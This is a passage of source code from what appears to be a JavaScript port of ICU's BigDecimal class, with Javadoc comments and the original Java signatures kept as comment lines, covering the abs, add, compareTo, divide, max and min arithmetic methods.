&lt;code&gt;String&lt;/code&gt; form must have at least * one digit, may have a leading sign, may have a decimal point, and * exponential notation may be used. They follow conventional syntax, * and may not contain blanks. * &lt;p&gt; * Some valid strings from which a &lt;code&gt;BigDecimal&lt;/code&gt; might * be constructed are: * &lt;pre&gt; * \"0\" -- Zero * \"12\" -- A whole number * \"-76\" -- A signed whole number * \"12.70\" -- Some decimal places * \"+0.003\" -- Plus sign is allowed * \"17.\" -- The same as 17 * \".5\" -- The same as 0.5 * \"4E+9\" -- Exponential notation * \"0.73e-7\" -- Exponential notation * &lt;/pre&gt; * &lt;p&gt; * (Exponential notation means that the number includes an optional * sign and a power of ten following an '&lt;/code&gt;E&lt;/code&gt;' that * indicates how the decimal point will be shifted. Thus the * &lt;code&gt;\"4E+9\"&lt;/code&gt; above is just a short way of writing * &lt;code&gt;4000000000&lt;/code&gt;, and the &lt;code&gt;\"0.73e-7\"&lt;/code&gt; is short * for &lt;code&gt;0.000000073&lt;/code&gt;.) * &lt;p&gt; * The &lt;code&gt;BigDecimal&lt;/code&gt; constructed from the String is in a * standard form, with no blanks, as though the * &#123;@link #add(BigDecimal)&#125; method had been used to add zero to the * number with unlimited precision. * If the string uses exponential notation (that is, includes an * &lt;code&gt;e&lt;/code&gt; or an &lt;code&gt;E&lt;/code&gt;), then the * &lt;code&gt;BigDecimal&lt;/code&gt; number will be expressed in scientific * notation (where the power of ten is adjusted so there is a single * non-zero digit to the left of the decimal point); in this case if * the number is zero then it will be expressed as the single digit 0, * and if non-zero it will have an exponent unless that exponent would * be 0. The exponent must fit in nine digits both before and after it * is expressed in scientific notation. * &lt;p&gt; * Any digits in the parameter must be decimal; that is, * &lt;code&gt;Character.digit(c, 10)&lt;/code&gt; (where &lt;/code&gt;c&lt;/code&gt; is the * character in question) would not return -1. * * @param string The &lt;code&gt;String&lt;/code&gt; to be converted. * @throws NumberFormatException if the parameter is not a valid * number. * @stable ICU 2.0 */ //--public BigDecimal(java.lang.String string)&#123; //-- this(string.toCharArray(),0,string.length()); //-- return;&#125; /* &lt;sgml&gt; Make a default BigDecimal object for local use. &lt;/sgml&gt; */ //--private BigDecimal()&#123;super(); //-- return; //-- &#125; /* ---------------------------------------------------------------- */ /* Operator methods [methods which take a context parameter] */ /* ---------------------------------------------------------------- */ /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute * value of this &lt;code&gt;BigDecimal&lt;/code&gt;. * &lt;p&gt; * The same as &#123;@link #abs(MathContext)&#125;, where the context is * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will * be &lt;code&gt;this.scale()&lt;/code&gt; * * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute * value of this &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal abs()&#123; //- return this.abs(plainMC); //- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute value * of this &lt;code&gt;BigDecimal&lt;/code&gt;. * &lt;p&gt; * If the current object is zero or positive, then the same result as * invoking the &#123;@link #plus(MathContext)&#125; method with the same * parameter is returned. * Otherwise, the same result as invoking the * &#123;@link #negate(MathContext)&#125; method with the same parameter is * returned. * * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute * value of this &lt;code&gt;BigDecimal&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal abs(com.ibm.icu.math.MathContext set)&#123; function abs() &#123; var set; if (abs.arguments.length == 1) &#123; set = abs.arguments[0]; &#125; else if (abs.arguments.length == 0) &#123; set = this.plainMC; &#125; else &#123; throw \"abs(): \" + abs.arguments.length + \" arguments given; expected 0 or 1\"; &#125; if (this.ind==this.isneg) return this.negate(set); return this.plus(set); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this+rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #add(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * the maximum of the scales of the two operands. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the addition. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this+rhs&lt;/code&gt;, using fixed point arithmetic. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal add(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.add(rhs,plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this+rhs&lt;/code&gt;. * &lt;p&gt; * Implements the addition (&lt;b&gt;&lt;code&gt;+&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the addition. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this+rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal add(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function add() &#123; var set; if (add.arguments.length == 2) &#123; set = add.arguments[1]; &#125; else if (add.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"add(): \" + add.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = add.arguments[0]; //--com.ibm.icu.math.BigDecimal lhs; var lhs; //--int reqdig; var reqdig; //--com.ibm.icu.math.BigDecimal res; var res; //--byte usel[]; var usel; //--int usellen; var usellen; //--byte user[]; var user; //--int userlen; var userlen; //--int newlen=0; var newlen=0; //--int tlen=0; var tlen=0; //--int mult=0; var mult=0; //--byte t[]=null; var t=null; //--int ia=0; var ia=0; //--int ib=0; var ib=0; //--int ea=0; var ea=0; //int eb=0; var eb=0; //byte ca=0; var ca=0; //--byte cb=0; var cb=0; /* determine requested digits and form */ if (set.lostDigits) this.checkdigits(rhs,set.digits); lhs=this; // name for clarity and proxy /* Quick exit for add floating 0 */ // plus() will optimize to return same object if possible if (lhs.ind==0) if (set.form!=MathContext.prototype.PLAIN) return rhs.plus(set); if (rhs.ind==0) if (set.form!=MathContext.prototype.PLAIN) return lhs.plus(set); /* Prepare numbers (round, unless unlimited precision) */ reqdig=set.digits; // local copy (heavily used) if (reqdig&gt;0) &#123; if (lhs.mant.length&gt;reqdig) lhs=this.clone(lhs).round(set); if (rhs.mant.length&gt;reqdig) rhs=this.clone(rhs).round(set); // [we could reuse the new LHS for result in this case] &#125; res=new BigDecimal(); // build result here /* Now see how much we have to pad or truncate lhs or rhs in order to align the numbers. If one number is much larger than the other, then the smaller cannot affect the answer [but we may still need to pad with up to DIGITS trailing zeros]. */ // Note sign may be 0 if digits (reqdig) is 0 // usel and user will be the byte arrays passed to the adder; we'll // use them on all paths except quick exits usel=lhs.mant; usellen=lhs.mant.length; user=rhs.mant; userlen=rhs.mant.length; &#123;padder:do&#123;/*select*/ if (lhs.exp==rhs.exp) &#123;/* no padding needed */ // This is the most common, and fastest, path res.exp=lhs.exp; &#125; else if (lhs.exp&gt;rhs.exp) &#123; // need to pad lhs and/or truncate rhs newlen=(usellen+lhs.exp)-rhs.exp; /* If, after pad, lhs would be longer than rhs by digits+1 or more (and digits&gt;0) then rhs cannot affect answer, so we only need to pad up to a length of DIGITS+1. */ if (newlen&gt;=((userlen+reqdig)+1)) if (reqdig&gt;0) &#123; // LHS is sufficient res.mant=usel; res.exp=lhs.exp; res.ind=lhs.ind; if (usellen&lt;reqdig) &#123; // need 0 padding res.mant=this.extend(lhs.mant,reqdig); res.exp=res.exp-((reqdig-usellen)); &#125; return res.finish(set,false); &#125; // RHS may affect result res.exp=rhs.exp; // expected final exponent if (newlen&gt;(reqdig+1)) if (reqdig&gt;0) &#123; // LHS will be max; RHS truncated tlen=(newlen-reqdig)-1; // truncation length userlen=userlen-tlen; res.exp=res.exp+tlen; newlen=reqdig+1; &#125; if (newlen&gt;usellen) usellen=newlen; // need to pad LHS &#125; else&#123; // need to pad rhs and/or truncate lhs newlen=(userlen+rhs.exp)-lhs.exp; if (newlen&gt;=((usellen+reqdig)+1)) if (reqdig&gt;0) &#123; // RHS is sufficient res.mant=user; res.exp=rhs.exp; res.ind=rhs.ind; if (userlen&lt;reqdig) &#123; // need 0 padding res.mant=this.extend(rhs.mant,reqdig); res.exp=res.exp-((reqdig-userlen)); &#125; return res.finish(set,false); &#125; // LHS may affect result res.exp=lhs.exp; // expected final exponent if (newlen&gt;(reqdig+1)) if (reqdig&gt;0) &#123; // RHS will be max; LHS truncated tlen=(newlen-reqdig)-1; // truncation length usellen=usellen-tlen; res.exp=res.exp+tlen; newlen=reqdig+1; &#125; if (newlen&gt;userlen) userlen=newlen; // need to pad RHS &#125; &#125;while(false);&#125;/*padder*/ /* OK, we have aligned mantissas. Now add or subtract. */ // 1998.06.27 Sign may now be 0 [e.g., 0.000] .. treat as positive // 1999.05.27 Allow for 00 on lhs [is not larger than 2 on rhs] // 1999.07.10 Allow for 00 on rhs [is not larger than 2 on rhs] if (lhs.ind==this.iszero) res.ind=this.ispos; else res.ind=lhs.ind; // likely sign, all paths if (((lhs.ind==this.isneg)?1:0)==((rhs.ind==this.isneg)?1:0)) // same sign, 0 non-negative mult=1; else &#123;signdiff:do&#123; // different signs, so subtraction is needed mult=-1; // will cause subtract /* Before we can subtract we must determine which is the larger, as our add/subtract routine only handles non-negative results so we may need to swap the operands. */ &#123;swaptest:do&#123;/*select*/ if (rhs.ind==this.iszero) &#123;&#125; // original A bigger else if ((usellen&lt;userlen)||(lhs.ind==this.iszero)) &#123; // original B bigger t=usel; usel=user; user=t; // swap tlen=usellen; usellen=userlen; userlen=tlen; // .. res.ind=-res.ind; // and set sign &#125; else if (usellen&gt;userlen) &#123;&#125; // original A bigger else&#123; &#123;/* logical lengths the same */ // need compare /* may still need to swap: compare the strings */ ia=0; ib=0; ea=usel.length-1; eb=user.length-1; &#123;compare:for(;;)&#123; if (ia&lt;=ea) ca=usel[ia]; else &#123; if (ib&gt;eb) &#123;/* identical */ if (set.form!=MathContext.prototype.PLAIN) return this.ZERO; // [if PLAIN we must do the subtract, in case of 0.000 results] break compare; &#125; ca=0; &#125; if (ib&lt;=eb) cb=user[ib]; else cb=0; if (ca!=cb) &#123; if (ca&lt;cb) &#123;/* swap needed */ t=usel; usel=user; user=t; // swap tlen=usellen; usellen=userlen; userlen=tlen; // .. res.ind=-res.ind; &#125; break compare; &#125; /* mantissas the same, so far */ ia++; ib++; &#125; &#125;/*compare*/ &#125; // lengths the same &#125; &#125;while(false);&#125;/*swaptest*/ &#125;while(false);&#125;/*signdiff*/ /* here, A is &gt; B if subtracting */ // add [A+B*1] or subtract [A+(B*-1)] res.mant=this.byteaddsub(usel,usellen,user,userlen,mult,false); // [reuse possible only after chop; accounting makes not worthwhile] // Finish() rounds before stripping leading 0's, then sets form, etc. return res.finish(set,false); &#125; /** * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; to another, using unlimited * precision. * &lt;p&gt; * The same as &#123;@link #compareTo(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @return An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as * &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to, * or greater than &lt;code&gt;rhs&lt;/code&gt;. * @see #compareTo(Object) * @stable ICU 2.0 */ //--public int compareTo(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.compareTo(rhs,plainMC); //-- &#125; /** * Compares this &lt;code&gt;BigDecimal&lt;/code&gt; to another. * &lt;p&gt; * Implements numeric comparison, * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns a result of type &lt;code&gt;int&lt;/code&gt;. * &lt;p&gt; * The result will be: * &lt;table cellpadding=2&gt;&lt;tr&gt; * &lt;td align=right&gt;&lt;b&gt;-1&lt;/b&gt;&lt;/td&gt; * &lt;td&gt;if the current object is less than the first parameter&lt;/td&gt; * &lt;/tr&gt;&lt;tr&gt; * &lt;td align=right&gt;&lt;b&gt;0&lt;/b&gt;&lt;/td&gt; * &lt;td&gt;if the current object is equal to the first parameter&lt;/td&gt; * &lt;/tr&gt;&lt;tr&gt; * &lt;td align=right&gt;&lt;b&gt;1&lt;/b&gt;&lt;/td&gt; * &lt;td&gt;if the current object is greater than the first parameter.&lt;/td&gt; * &lt;/tr&gt;&lt;/table&gt; * &lt;p&gt; * A &#123;@link #compareTo(Object)&#125; method is also provided. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return An &lt;code&gt;int&lt;/code&gt; whose value is -1, 0, or 1 as * &lt;code&gt;this&lt;/code&gt; is numerically less than, equal to, * or greater than &lt;code&gt;rhs&lt;/code&gt;. * @see #compareTo(Object) * @stable ICU 2.0 */ //public int compareTo(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function compareTo() &#123; var set; if (compareTo.arguments.length == 2) &#123; set = compareTo.arguments[1]; &#125; else if (compareTo.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"compareTo(): \" + compareTo.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = compareTo.arguments[0]; //--int thislength=0; var thislength=0; //--int i=0; var i=0; //--com.ibm.icu.math.BigDecimal newrhs; var newrhs; // rhs=null will raise NullPointerException, as per Comparable interface if (set.lostDigits) this.checkdigits(rhs,set.digits); // [add will recheck in slowpath cases .. but would report -rhs] if ((this.ind==rhs.ind)&amp;&amp;(this.exp==rhs.exp)) &#123; /* sign &amp; exponent the same [very common] */ thislength=this.mant.length; if (thislength&lt;rhs.mant.length) return -this.ind; if (thislength&gt;rhs.mant.length) return this.ind; /* lengths are the same; we can do a straight mantissa compare unless maybe rounding [rounding is very unusual] */ if ((thislength&lt;=set.digits)||(set.digits==0)) &#123; &#123;var $6=thislength;i=0;i:for(;$6&gt;0;$6--,i++)&#123; if (this.mant[i]&lt;rhs.mant[i]) return -this.ind; if (this.mant[i]&gt;rhs.mant[i]) return this.ind; &#125; &#125;/*i*/ return 0; // identical &#125; /* drop through for full comparison */ &#125; else &#123; /* More fastpaths possible */ if (this.ind&lt;rhs.ind) return -1; if (this.ind&gt;rhs.ind) return 1; &#125; /* carry out a subtract to make the comparison */ newrhs=this.clone(rhs); // safe copy newrhs.ind=-newrhs.ind; // prepare to subtract return this.add(newrhs,set).ind; // add, and return sign of result &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #divide(BigDecimal, int)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the rounding mode is &#123;@link MathContext#ROUND_HALF_UP&#125;. * * The length of the decimal part (the scale) of the result will be * the same as the scale of the current object, if the latter were * formatted without exponential notation. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the division. * @return A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.dodivide('D',rhs,plainMC,-1); //-- &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic and a * rounding mode. * &lt;p&gt; * The same as &#123;@link #divide(BigDecimal, int, int)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the second parameter is &lt;code&gt;this.scale()&lt;/code&gt;, and * the third is &lt;code&gt;round&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will * therefore be the same as the scale of the current object, if the * latter were formatted without exponential notation. * &lt;p&gt; * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the division. * @param round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for * the division (see the &#123;@link MathContext&#125; class). * @return A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic * and the specified rounding mode. * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a * valid rounding mode. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is &#123;@link * MathContext#ROUND_UNNECESSARY&#125; and * &lt;code&gt;this.scale()&lt;/code&gt; is insufficient to * represent the result exactly. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,int round)&#123; //-- com.ibm.icu.math.MathContext set; //-- set=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN,false,round); // [checks round, too] //-- return this.dodivide('D',rhs,set,-1); // take scale from LHS //-- &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic and a * given scale and rounding mode. * &lt;p&gt; * The same as &#123;@link #divide(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * &lt;code&gt;new MathContext(0, MathContext.PLAIN, false, round)&lt;/code&gt;, * except that the length of the decimal part (the scale) to be used * for the result is explicit rather than being taken from * &lt;code&gt;this&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * the same as the scale of the current object, if the latter were * formatted without exponential notation. * &lt;p&gt; * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the division. * @param scale The &lt;code&gt;int&lt;/code&gt; scale to be used for the result. * @param round The &lt;code&gt;int&lt;/code&gt; rounding mode to be used for * the division (see the &#123;@link MathContext&#125; class). * @return A plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;, using fixed point arithmetic * and the specified rounding mode. * @throws IllegalArgumentException if &lt;code&gt;round&lt;/code&gt; is not a * valid rounding mode. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @throws ArithmeticException if &lt;code&gt;scale&lt;/code&gt; is negative. * @throws ArithmeticException if &lt;code&gt;round&lt;/code&gt; is &#123;@link * MathContext#ROUND_UNNECESSARY&#125; and &lt;code&gt;scale&lt;/code&gt; * is insufficient to represent the result exactly. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,int scale,int round)&#123; //-- com.ibm.icu.math.MathContext set; //-- if (scale&lt;0) //-- throw new java.lang.ArithmeticException(\"Negative scale:\"+\" \"+scale); //-- set=new com.ibm.icu.math.MathContext(0,com.ibm.icu.math.MathContext.PLAIN,false,round); // [checks round] //-- return this.dodivide('D',rhs,set,scale); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this/rhs&lt;/code&gt;. * &lt;p&gt; * Implements the division (&lt;b&gt;&lt;code&gt;/&lt;/code&gt;&lt;/b&gt;) operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the division. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this/rhs&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divide(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function divide() &#123; var set; var scale = -1; if (divide.arguments.length == 2) &#123; if (typeof divide.arguments[1] == 'number') &#123; set=new MathContext(0,MathContext.prototype.PLAIN,false,divide.arguments[1]); // [checks round, too] &#125; else &#123; set = divide.arguments[1]; &#125; &#125; else if (divide.arguments.length == 3) &#123; scale = divide.arguments[1]; if (scale&lt;0) throw \"divide(): Negative scale: \"+scale; set=new MathContext(0,MathContext.prototype.PLAIN,false,divide.arguments[2]); // [checks round] &#125; else if (divide.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"divide(): \" + divide.arguments.length + \" arguments given; expected between 1 and 3\"; &#125; var rhs = divide.arguments[0]; return this.dodivide('D',rhs,set,scale); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer * part of &lt;code&gt;this/rhs&lt;/code&gt;. * &lt;p&gt; * The same as &#123;@link #divideInteger(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the integer division. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer * part of &lt;code&gt;this/rhs&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divideInteger(com.ibm.icu.math.BigDecimal rhs)&#123; //-- // scale 0 to drop .000 when plain //-- return this.dodivide('I',rhs,plainMC,0); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer * part of &lt;code&gt;this/rhs&lt;/code&gt;. * &lt;p&gt; * Implements the integer division operator * (as defined in the decimal documentation, see &#123;@link BigDecimal * class header&#125;), * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the integer division. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the integer * part of &lt;code&gt;this/rhs&lt;/code&gt;. * @throws ArithmeticException if &lt;code&gt;rhs&lt;/code&gt; is zero. * @throws ArithmeticException if the result will not fit in the * number of digits specified for the context. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal divideInteger(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function divideInteger() &#123; var set; if (divideInteger.arguments.length == 2) &#123; set = divideInteger.arguments[1]; &#125; else if (divideInteger.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"divideInteger(): \" + divideInteger.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = divideInteger.arguments[0]; // scale 0 to drop .000 when plain return this.dodivide('I',rhs,set,0); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * &lt;p&gt; * The same as &#123;@link #max(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal max(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.max(rhs,plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * &lt;p&gt; * Returns the larger of the current object and the first parameter. * &lt;p&gt; * If calling the &#123;@link #compareTo(BigDecimal, MathContext)&#125; method * with the same parameters would return &lt;code&gt;1&lt;/code&gt; or * &lt;code&gt;0&lt;/code&gt;, then the result of calling the * &#123;@link #plus(MathContext)&#125; method on the current object (using the * same &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned. * Otherwise, the result of calling the &#123;@link #plus(MathContext)&#125; * method on the first parameter object (using the same * &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal max(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function max() &#123; var set; if (max.arguments.length == 2) &#123; set = max.arguments[1]; &#125; else if (max.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"max(): \" + max.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = max.arguments[0]; if ((this.compareTo(rhs,set))&gt;=0) return this.plus(set); else return rhs.plus(set); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * &lt;p&gt; * The same as &#123;@link #min(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal min(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.min(rhs,plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * &lt;p&gt; * Returns the smaller of the current object and the first parameter. * &lt;p&gt; * If calling the &#123;@link #compareTo(BigDecimal, MathContext)&#125; method * with the same parameters would return &lt;code&gt;-1&lt;/code&gt; or * &lt;code&gt;0&lt;/code&gt;, then the result of calling the * &#123;@link #plus(MathContext)&#125; method on the current object (using the * same &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned. * Otherwise, the result of calling the &#123;@link #plus(MathContext)&#125; * method on the first parameter object (using the same * &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the comparison. * @param set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal min(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123; function min() &#123; var set; if (min.arguments.length == 2) &#123; set = min.arguments[1]; &#125; else if (min.arguments.length == 1) &#123; set = this.plainMC; &#125; else &#123; throw \"min(): \" + min.arguments.length + \" arguments given; expected 1 or 2\"; &#125; var rhs = min.arguments[0]; if ((this.compareTo(rhs,set))&lt;=0) return this.plus(set); else return rhs.plus(set); &#125; /** * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this*rhs&lt;/code&gt;, using fixed point arithmetic. * &lt;p&gt; * The same as &#123;@link #add(BigDecimal, MathContext)&#125;, * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;, * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;. * &lt;p&gt; * The length of the decimal part (the scale) of the result will be * the sum of the scales of the operands, if they were formatted * without exponential notation. * * @param rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of * the multiplication. * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is * &lt;code&gt;this*rhs&lt;/code&gt;, using fixed point arithmetic. * @stable ICU 2.0 */ //--public com.ibm.icu.math.BigDecimal multiply(com.ibm.icu.math.BigDecimal rhs)&#123; //-- return this.multiply(rhs,plainMC); //-- &#125; /** * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this*rhs&lt;/code&gt;. * &lt;p&gt; * Implements the multiplication 